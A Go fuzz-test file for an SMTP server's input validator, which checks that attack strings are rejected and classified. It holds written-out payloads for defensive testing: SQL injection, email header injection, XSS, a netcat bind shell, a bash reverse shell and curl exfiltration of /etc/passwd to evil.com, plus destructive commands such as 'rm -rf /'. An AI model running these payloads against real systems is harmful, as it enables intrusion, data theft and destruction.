package tests

import (
	"crypto/rand"
	"fmt"
	"log/slog"
	"os"
	"strings"
	"testing"
	"unicode"
	"unicode/utf8"

	"github.com/busybox42/elemta/internal/smtp"
)

// FuzzTestCase represents a fuzzing test case
type FuzzTestCase struct {
	Name           string
	Input          string
	ExpectedValid  bool
	ExpectedThreat string
	Description    string
}

// TestEnhancedValidationFuzzing performs comprehensive fuzzing tests on input validation
func TestEnhancedValidationFuzzing(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	validator := smtp.NewEnhancedValidator(logger)
	
	t.Run("EmailParameterFuzzing", func(t *testing.T) {
		testEmailParameterFuzzing(t, validator)
	})
	
	t.Run("HostnameParameterFuzzing", func(t *testing.T) {
		testHostnameParameterFuzzing(t, validator)
	})
	
	t.Run("UnicodeNormalizationFuzzing", func(t *testing.T) {
		testUnicodeNormalizationFuzzing(t, validator)
	})
	
	t.Run("HeaderInjectionFuzzing", func(t *testing.T) {
		testHeaderInjectionFuzzing(t, validator)
	})
	
	t.Run("SQLInjectionFuzzing", func(t *testing.T) {
		testSQLInjectionFuzzing(t, validator)
	})
	
	t.Run("CommandInjectionFuzzing", func(t *testing.T) {
		testCommandInjectionFuzzing(t, validator)
	})
	
	t.Run("BufferOverflowFuzzing", func(t *testing.T) {
		testBufferOverflowFuzzing(t, validator)
	})
	
	t.Run("SafeLoggingFuzzing", func(t *testing.T) {
		testSafeLoggingFuzzing(t, validator)
	})
}

// testEmailParameterFuzzing tests email parameter validation with various attack vectors
func testEmailParameterFuzzing(t *testing.T, validator *smtp.EnhancedValidator) {
	testCases := []FuzzTestCase{
		// Valid cases
		{
			Name:          "ValidEmail",
			Input:         "user@example.com",
			ExpectedValid: true,
			Description:   "Standard valid email address",
		},
		{
			Name:          "NullSender",
			Input:         "<>",
			ExpectedValid: true,
			Description:   "RFC 5321 null sender for bounce messages",
		},
		{
			Name:          "ComplexValidEmail",
			Input:         "user+tag@sub.example.com",
			ExpectedValid: true,
			Description:   "Valid email with plus addressing and subdomain",
		},
		
		// Length attacks
		{
			Name:          "TooLongEmail",
			Input:         strings.Repeat("a", 250) + "@" + strings.Repeat("b", 250) + ".com",
			ExpectedValid: false,
			ExpectedThreat: "buffer_overflow_attempt",
			Description:   "Email exceeding RFC 5321 length limits",
		},
		{
			Name:          "TooLongLocalPart",
			Input:         strings.Repeat("a", 65) + "@example.com",
			ExpectedValid: false,
			Description:   "Local part exceeding 64 character limit",
		},
		{
			Name:          "TooLongDomain",
			Input:         "user@" + strings.Repeat("a", 250) + ".com",
			ExpectedValid: false,
			Description:   "Domain exceeding 255 character limit",
		},
		
		// Command injection attacks
		{
			Name:          "CommandInjectionPipe",
			Input:         "user@example.com|rm -rf /",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Command injection using pipe",
		},
		{
			Name:          "CommandInjectionAmpersand",
			Input:         "user@example.com && cat /etc/passwd",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Command injection using ampersand",
		},
		{
			Name:          "CommandInjectionSemicolon",
			Input:         "user@example.com; wget evil.com/shell.sh",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Command injection using semicolon",
		},
		{
			Name:          "CommandInjectionBackticks",
			Input:         "user@example.com`id`",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Command injection using backticks",
		},
		{
			Name:          "CommandInjectionDollar",
			Input:         "user@example.com$(whoami)",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Command injection using dollar substitution",
		},
		
		// SQL injection attacks
		{
			Name:          "SQLInjectionUnion",
			Input:         "user@example.com' UNION SELECT * FROM users--",
			ExpectedValid: false,
			ExpectedThreat: "sql_injection_attack",
			Description:   "SQL injection using UNION SELECT",
		},
		{
			Name:          "SQLInjectionDrop",
			Input:         "user@example.com'; DROP TABLE users; --",
			ExpectedValid: false,
			ExpectedThreat: "sql_injection_attack",
			Description:   "SQL injection using DROP TABLE",
		},
		{
			Name:          "SQLInjectionInsert",
			Input:         "user@example.com' OR '1'='1",
			ExpectedValid: false,
			ExpectedThreat: "sql_injection_attack",
			Description:   "SQL injection using boolean logic",
		},
		
		// Control character attacks
		{
			Name:          "NullByteInjection",
			Input:         "user@example.com\x00admin",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Null byte injection attack",
		},
		{
			Name:          "CarriageReturnInjection",
			Input:         "user@example.com\rDATA",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Carriage return injection",
		},
		{
			Name:          "LineFeedInjection",
			Input:         "user@example.com\nQUIT",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Line feed injection",
		},
		
		// Path traversal attacks
		{
			Name:          "PathTraversalUnix",
			Input:         "user@example.com/../../../etc/passwd",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Unix path traversal attack",
		},
		{
			Name:          "PathTraversalWindows",
			Input:         "user@example.com\\..\\..\\windows\\system32",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Windows path traversal attack",
		},
		
		// Script injection attacks
		{
			Name:          "ScriptInjection",
			Input:         "user@example.com<script>alert('xss')</script>",
			ExpectedValid: false,
			ExpectedThreat: "general_attack",
			Description:   "Script injection attack",
		},
		{
			Name:          "JavascriptInjection",
			Input:         "user@example.com javascript:alert(1)",
			ExpectedValid: false,
			ExpectedThreat: "general_attack",
			Description:   "JavaScript protocol injection",
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.Name, func(t *testing.T) {
			result := validator.ValidateSMTPParameter("MAIL_FROM", tc.Input)
			
			if result.Valid != tc.ExpectedValid {
				t.Errorf("Test %s failed: expected valid=%v, got valid=%v", 
					tc.Name, tc.ExpectedValid, result.Valid)
				t.Errorf("Error: %s", result.ErrorMessage)
			}
			
			if !tc.ExpectedValid && tc.ExpectedThreat != "" {
				if result.SecurityThreat != tc.ExpectedThreat {
					t.Errorf("Test %s failed: expected threat=%s, got threat=%s", 
						tc.Name, tc.ExpectedThreat, result.SecurityThreat)
				}
			}
			
			// Ensure sanitized value is always safe
			if result.SanitizedValue != "" {
				if strings.Contains(result.SanitizedValue, "\x00") {
					t.Errorf("Test %s failed: sanitized value contains null bytes", tc.Name)
				}
			}
		})
	}
}

// testHostnameParameterFuzzing tests hostname parameter validation
func testHostnameParameterFuzzing(t *testing.T, validator *smtp.EnhancedValidator) {
	testCases := []FuzzTestCase{
		// Valid cases
		{
			Name:          "ValidHostname",
			Input:         "mail.example.com",
			ExpectedValid: true,
			Description:   "Standard valid hostname",
		},
		{
			Name:          "ValidIP",
			Input:         "192.168.1.1",
			ExpectedValid: true,
			Description:   "Valid IP address",
		},
		
		// Length attacks
		{
			Name:          "TooLongHostname",
			Input:         strings.Repeat("a", 260) + ".com",
			ExpectedValid: false,
			ExpectedThreat: "buffer_overflow_attempt",
			Description:   "Hostname exceeding 255 character limit",
		},
		{
			Name:          "TooLongLabel",
			Input:         strings.Repeat("a", 70) + ".example.com",
			ExpectedValid: false,
			Description:   "Label exceeding 63 character limit",
		},
		
		// Command injection in hostname
		{
			Name:          "HostnameCommandInjection",
			Input:         "mail.example.com; rm -rf /",
			ExpectedValid: false,
			ExpectedThreat: "command_injection_attack",
			Description:   "Command injection in hostname",
		},
		{
			Name:          "HostnameSQLInjection",
			Input:         "mail.example.com' OR 1=1--",
			ExpectedValid: false,
			ExpectedThreat: "sql_injection_attack",
			Description:   "SQL injection in hostname",
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.Name, func(t *testing.T) {
			result := validator.ValidateSMTPParameter("HELO", tc.Input)
			
			if result.Valid != tc.ExpectedValid {
				t.Errorf("Test %s failed: expected valid=%v, got valid=%v", 
					tc.Name, tc.ExpectedValid, result.Valid)
			}
			
			if !tc.ExpectedValid && tc.ExpectedThreat != "" {
				if result.SecurityThreat != tc.ExpectedThreat {
					t.Errorf("Test %s failed: expected threat=%s, got threat=%s", 
						tc.Name, tc.ExpectedThreat, result.SecurityThreat)
				}
			}
		})
	}
}

// testUnicodeNormalizationFuzzing tests Unicode normalization and security
func testUnicodeNormalizationFuzzing(t *testing.T, validator *smtp.EnhancedValidator) {
	testCases := []FuzzTestCase{
		// Valid Unicode
		{
			Name:          "ValidUnicode",
			Input:         "user@exämple.com",
			ExpectedValid: true,
			Description:   "Valid Unicode characters",
		},
		
		// Dangerous Unicode
		{
			Name:          "ZeroWidthChars",
			Input:         "user@exam\u200Bple.com", // Zero-width space
			ExpectedValid: false,
			ExpectedThreat: "unicode_attack",
			Description:   "Zero-width character attack",
		},
		{
			Name:          "ControlChars",
			Input:         "user@exam\u0001ple.com", // Control character
			ExpectedValid: false,
			ExpectedThreat: "unicode_attack",
			Description:   "Unicode control character",
		},
		{
			Name:          "ByteOrderMark",
			Input:         "user@exam\uFEFFple.com", // Byte Order Mark
			ExpectedValid: false,
			ExpectedThreat: "unicode_attack",
			Description:   "Byte Order Mark injection",
		},
		{
			Name:          "LineSeparator",
			Input:         "user@exam\u2028ple.com", // Line separator
			ExpectedValid: false,
			ExpectedThreat: "unicode_attack",
			Description:   "Unicode line separator",
		},
		
		// Homograph attacks
		{
			Name:          "CyrillicHomograph",
			Input:         "user@exаmple.com", // Cyrillic 'а' instead of Latin 'a'
			ExpectedValid: false,
			ExpectedThreat: "homograph_attack",
			Description:   "Cyrillic homograph attack",
		},
		
		// Invalid UTF-8
		{
			Name:          "InvalidUTF8",
			Input:         "user@exam\xFF\xFEple.com",
			ExpectedValid: false,
			ExpectedThreat: "encoding_attack",
			Description:   "Invalid UTF-8 sequence",
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.Name, func(t *testing.T) {
			result := validator.ValidateAndNormalizeUnicode(tc.Input)
			
			if result.Valid != tc.ExpectedValid {
				t.Errorf("Test %s failed: expected valid=%v, got valid=%v", 
					tc.Name, tc.ExpectedValid, result.Valid)
			}
			
			if !tc.ExpectedValid && tc.ExpectedThreat != "" {
				if result.SecurityThreat != tc.ExpectedThreat {
					t.Errorf("Test %s failed: expected threat=%s, got threat=%s", 
						tc.Name, tc.ExpectedThreat, result.SecurityThreat)
				}
			}
			
			// Check normalization worked
			if result.Valid && result.NormalizedValue == "" {
				t.Errorf("Test %s failed: normalized value is empty for valid input", tc.Name)
			}
		})
	}
}

// testHeaderInjectionFuzzing tests header injection prevention
func testHeaderInjectionFuzzing(t *testing.T, validator *smtp.EnhancedValidator) {
	testCases := []FuzzTestCase{
		// Valid headers
		{
			Name:          "ValidHeader",
			Input:         "Subject: Test Message",
			ExpectedValid: true,
			Description:   "Standard valid header",
		},
		
		// Header injection attacks
		{
			Name:          "CRLFInjection",
			Input:         "Subject: Test\r\nBcc: attacker@evil.com",
			ExpectedValid: false,
			ExpectedThreat: "header_injection_attack",
			Description:   "CRLF header injection",
		},
		{
			Name:          "LFInjection",
			Input:         "Subject: Test\nBcc: attacker@evil.com",
			ExpectedValid: false,
			ExpectedThreat: "header_injection_attack",
			Description:   "LF header injection",
		},
		{
			Name:          "CRInjection",
			Input:         "Subject: Test\rBcc: attacker@evil.com",
			ExpectedValid: false,
			ExpectedThreat: "header_injection_attack",
			Description:   "CR header injection",
		},
		{
			Name:          "HeaderInjectionWithTo",
			Input:         "Subject: Test\r\nTo: victim@example.com\r\nBcc: attacker@evil.com",
			ExpectedValid: false,
			ExpectedThreat: "header_injection_attack",
			Description:   "Complex header injection attack",
		},
		
		// Control character injection
		{
			Name:          "NullByteHeader",
			Input:         "Subject: Test\x00Message",
			ExpectedValid: false,
			ExpectedThreat: "header_injection_attack",
			Description:   "Null byte in header",
		},
		{
			Name:          "ControlCharHeader",
			Input:         "Subject: Test\x01Message",
			ExpectedValid: false,
			ExpectedThreat: "header_injection_attack",
			Description:   "Control character in header",
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.Name, func(t *testing.T) {
			result := validator.ValidateSMTPParameter("DATA_LINE", tc.Input)
			
			if result.Valid != tc.ExpectedValid {
				t.Errorf("Test %s failed: expected valid=%v, got valid=%v", 
					tc.Name, tc.ExpectedValid, result.Valid)
			}
			
			if !tc.ExpectedValid && tc.ExpectedThreat != "" {
				if result.SecurityThreat != tc.ExpectedThreat {
					t.Errorf("Test %s failed: expected threat=%s, got threat=%s", 
						tc.Name, tc.ExpectedThreat, result.SecurityThreat)
				}
			}
		})
	}
}

// testSQLInjectionFuzzing tests SQL injection detection
func testSQLInjectionFuzzing(t *testing.T, validator *smtp.EnhancedValidator) {
	sqlInjectionPayloads := []string{
		"' OR '1'='1",
		"' OR 1=1--",
		"' OR 1=1#",
		"' OR 1=1/*",
		"admin'--",
		"admin'/*",
		"' OR 'x'='x",
		"' AND id IS NULL; --",
		"'''''''''''''UNION SELECT '2",
		"%00' OR '1'='1",
		"' UNION SELECT NULL--",
		"' UNION ALL SELECT NULL--",
		"' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
		"; DROP TABLE users; --",
		"'; INSERT INTO users VALUES ('hacker', 'password'); --",
		"' OR (SELECT COUNT(*) FROM users) > 0--",
		"' OR SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
		"'; EXEC xp_cmdshell('dir'); --",
		"'; WAITFOR DELAY '00:00:10'; --",
		"' AND (SELECT SUBSTRING(@@version,1,1)) = '5'--",
	}
	
	for i, payload := range sqlInjectionPayloads {
		t.Run(fmt.Sprintf("SQLInjection%d", i), func(t *testing.T) {
			testInput := "user@example.com" + payload
			result := validator.ValidateSMTPParameter("MAIL_FROM", testInput)
			
			if result.Valid {
				t.Errorf("SQL injection payload not detected: %s", payload)
			}
			
			if result.SecurityThreat != "sql_injection_attack" {
				t.Errorf("Expected SQL injection threat, got: %s", result.SecurityThreat)
			}
		})
	}
}

// testCommandInjectionFuzzing tests command injection detection
func testCommandInjectionFuzzing(t *testing.T, validator *smtp.EnhancedValidator) {
	commandInjectionPayloads := []string{
		"; rm -rf /",
		"& del *.*",
		"| cat /etc/passwd",
		"&& whoami",
		"|| id",
		"`id`",
		"$(whoami)",
		"${PATH}",
		"; wget http://evil.com/shell.sh",
		"& powershell -c \"Get-Process\"",
		"| nc -l -p 4444 -e /bin/sh",
		"; curl http://evil.com/$(cat /etc/passwd)",
		"&& python -c 'import os; os.system(\"id\")'",
		"| perl -e 'system(\"id\")'",
		"; bash -i >& /dev/tcp/evil.com/4444 0>&1",
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\cmd.exe",
		"; format c:",
		"& fdisk /dev/sda",
	}
	
	for i, payload := range commandInjectionPayloads {
		t.Run(fmt.Sprintf("CommandInjection%d", i), func(t *testing.T) {
			testInput := "user@example.com" + payload
			result := validator.ValidateSMTPParameter("MAIL_FROM", testInput)
			
			if result.Valid {
				t.Errorf("Command injection payload not detected: %s", payload)
			}
			
			if result.SecurityThreat != "command_injection_attack" {
				t.Errorf("Expected command injection threat, got: %s", result.SecurityThreat)
			}
		})
	}
}

// testBufferOverflowFuzzing tests buffer overflow prevention
func testBufferOverflowFuzzing(t *testing.T, validator *smtp.EnhancedValidator) {
	// Test various length attacks
	lengths := []int{256, 512, 1024, 2048, 4096, 8192, 16384}
	
	for _, length := range lengths {
		t.Run(fmt.Sprintf("BufferOverflow%d", length), func(t *testing.T) {
			// Create oversized input
			longInput := "user@" + strings.Repeat("a", length) + ".com"
			
			result := validator.ValidateSMTPParameter("MAIL_FROM", longInput)
			
			// Should be rejected due to length
			if result.Valid {
				t.Errorf("Buffer overflow attack not detected for length %d", length)
			}
			
			// Should be identified as buffer overflow attempt
			if length > 320 && result.SecurityThreat != "buffer_overflow_attempt" {
				t.Errorf("Expected buffer overflow threat for length %d, got: %s", 
					length, result.SecurityThreat)
			}
		})
	}
}

// testSafeLoggingFuzzing tests safe logging function
func testSafeLoggingFuzzing(t *testing.T, validator *smtp.EnhancedValidator) {
	testCases := []struct {
		Name     string
		Input    string
		Expected string
	}{
		{
			Name:     "NullByte",
			Input:    "test\x00data",
			Expected: "test\\0data",
		},
		{
			Name:     "CarriageReturn",
			Input:    "test\rdata",
			Expected: "test\\rdata",
		},
		{
			Name:     "LineFeed",
			Input:    "test\ndata",
			Expected: "test\\ndata",
		},
		{
			Name:     "Tab",
			Input:    "test\tdata",
			Expected: "test\\tdata",
		},
		{
			Name:     "Backslash",
			Input:    "test\\data",
			Expected: "test\\\\data",
		},
		{
			Name:     "Quote",
			Input:    "test\"data",
			Expected: "test\\\"data",
		},
		{
			Name:     "ControlChar",
			Input:    "test\x01data",
			Expected: "test\\u0001data",
		},
		{
			Name:     "CombinedAttack",
			Input:    "test\x00\r\n\t\"\\attack",
			Expected: "test\\0\\r\\n\\t\\\"\\\\attack",
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.Name, func(t *testing.T) {
			result := smtp.SafeLogString(tc.Input)
			
			if result != tc.Expected {
				t.Errorf("Safe logging failed for %s: expected %q, got %q", 
					tc.Name, tc.Expected, result)
			}
			
			// Ensure no dangerous characters remain
			if strings.Contains(result, "\x00") || strings.Contains(result, "\r") || 
			   strings.Contains(result, "\n") {
				t.Errorf("Safe logging failed to sanitize dangerous characters in %s", tc.Name)
			}
		})
	}
}

// generateRandomBytes generates random bytes for fuzzing
func generateRandomBytes(length int) []byte {
	bytes := make([]byte, length)
	rand.Read(bytes)
	return bytes
}

// generateRandomString generates random string for fuzzing
func generateRandomString(length int) string {
	bytes := generateRandomBytes(length)
	var result strings.Builder
	
	for _, b := range bytes {
		// Convert to printable ASCII for basic string testing
		result.WriteByte(32 + (b % 95)) // Printable ASCII range
	}
	
	return result.String()
}

// TestRandomInputFuzzing performs random input fuzzing
func TestRandomInputFuzzing(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	validator := smtp.NewEnhancedValidator(logger)
	
	// Generate random inputs of various lengths
	lengths := []int{10, 50, 100, 256, 512, 1024}
	iterations := 100
	
	for _, length := range lengths {
		t.Run(fmt.Sprintf("RandomLength%d", length), func(t *testing.T) {
			for i := 0; i < iterations; i++ {
				// Generate random input
				randomInput := generateRandomString(length)
				
				// Test various parameter types
				paramTypes := []string{"MAIL_FROM", "RCPT_TO", "HELO", "DATA_LINE"}
				
				for _, paramType := range paramTypes {
					result := validator.ValidateSMTPParameter(paramType, randomInput)
					
					// Validation should not panic or crash
					if result == nil {
						t.Errorf("Validator returned nil result for random input")
					}
					
					// Sanitized value should never contain null bytes
					if result.SanitizedValue != "" && strings.Contains(result.SanitizedValue, "\x00") {
						t.Errorf("Sanitized value contains null bytes")
					}
				}
			}
		})
	}
}

// BenchmarkValidation benchmarks validation performance
func BenchmarkValidation(b *testing.B) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	validator := smtp.NewEnhancedValidator(logger)
	
	testInputs := []string{
		"user@example.com",
		"very.long.email.address.with.many.dots@very.long.domain.name.example.com",
		"user+tag@example.com",
		"user@192.168.1.1",
		"mail.example.com",
		"Subject: This is a test message",
	}
	
	b.ResetTimer()
	
	for i := 0; i < b.N; i++ {
		input := testInputs[i%len(testInputs)]
		validator.ValidateSMTPParameter("MAIL_FROM", input)
	}
}

// TestEdgeCases tests edge cases and boundary conditions
func TestEdgeCases(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	validator := smtp.NewEnhancedValidator(logger)
	
	edgeCases := []struct {
		Name  string
		Input string
	}{
		{"EmptyString", ""},
		{"SingleChar", "a"},
		{"OnlySpaces", "   "},
		{"OnlyTabs", "\t\t\t"},
		{"OnlyNewlines", "\n\n\n"},
		{"MixedWhitespace", " \t\n\r "},
		{"UnicodeSpaces", "\u00A0\u2000\u2001\u2002"},
		{"MaxLengthEmail", strings.Repeat("a", 64) + "@" + strings.Repeat("b", 251) + ".com"},
		{"JustOverMaxLength", strings.Repeat("a", 64) + "@" + strings.Repeat("b", 252) + ".com"},
		{"AllPrintableASCII", generatePrintableASCII()},
		{"AllControlChars", generateControlChars()},
	}
	
	for _, tc := range edgeCases {
		t.Run(tc.Name, func(t *testing.T) {
			// Test with different parameter types
			paramTypes := []string{"MAIL_FROM", "RCPT_TO", "HELO", "DATA_LINE"}
			
			for _, paramType := range paramTypes {
				result := validator.ValidateSMTPParameter(paramType, tc.Input)
				
				// Should not panic
				if result == nil {
					t.Errorf("Validator returned nil for edge case %s", tc.Name)
				}
				
				// Test Unicode validation
				unicodeResult := validator.ValidateAndNormalizeUnicode(tc.Input)
				if unicodeResult == nil {
					t.Errorf("Unicode validator returned nil for edge case %s", tc.Name)
				}
			}
		})
	}
}

// generatePrintableASCII generates a string with all printable ASCII characters
func generatePrintableASCII() string {
	var result strings.Builder
	for i := 32; i <= 126; i++ {
		result.WriteByte(byte(i))
	}
	return result.String()
}

// generateControlChars generates a string with control characters
func generateControlChars() string {
	var result strings.Builder
	for i := 0; i <= 31; i++ {
		result.WriteByte(byte(i))
	}
	result.WriteByte(127) // DEL character
	return result.String()
}

// TestUTF8Validation tests UTF-8 validation edge cases
func TestUTF8Validation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	validator := smtp.NewEnhancedValidator(logger)
	
	utf8TestCases := []struct {
		Name        string
		Input       string
		ShouldBeValid bool
	}{
		{"ValidUTF8", "Hello, 世界", true},
		{"ValidEmoji", "Hello 👋 World 🌍", true},
		{"InvalidUTF8", string([]byte{0xFF, 0xFE, 0xFD}), false},
		{"IncompleteUTF8", string([]byte{0xC2}), false},
		{"OverlongEncoding", string([]byte{0xC0, 0x80}), false},
		{"SurrogateHalf", string([]byte{0xED, 0xA0, 0x80}), false},
		{"MaxValidUTF8", string(rune(0x10FFFF)), true},
		{"InvalidCodePoint", string([]byte{0xF4, 0x90, 0x80, 0x80}), false},
	}
	
	for _, tc := range utf8TestCases {
		t.Run(tc.Name, func(t *testing.T) {
			result := validator.ValidateAndNormalizeUnicode(tc.Input)
			
			isValidUTF8 := utf8.ValidString(tc.Input)
			if isValidUTF8 != tc.ShouldBeValid {
				t.Logf("UTF-8 validity mismatch for %s: expected %v, got %v", 
					tc.Name, tc.ShouldBeValid, isValidUTF8)
			}
			
			if result.Valid && !isValidUTF8 {
				t.Errorf("Validator accepted invalid UTF-8 for %s", tc.Name)
			}
		})
	}
}
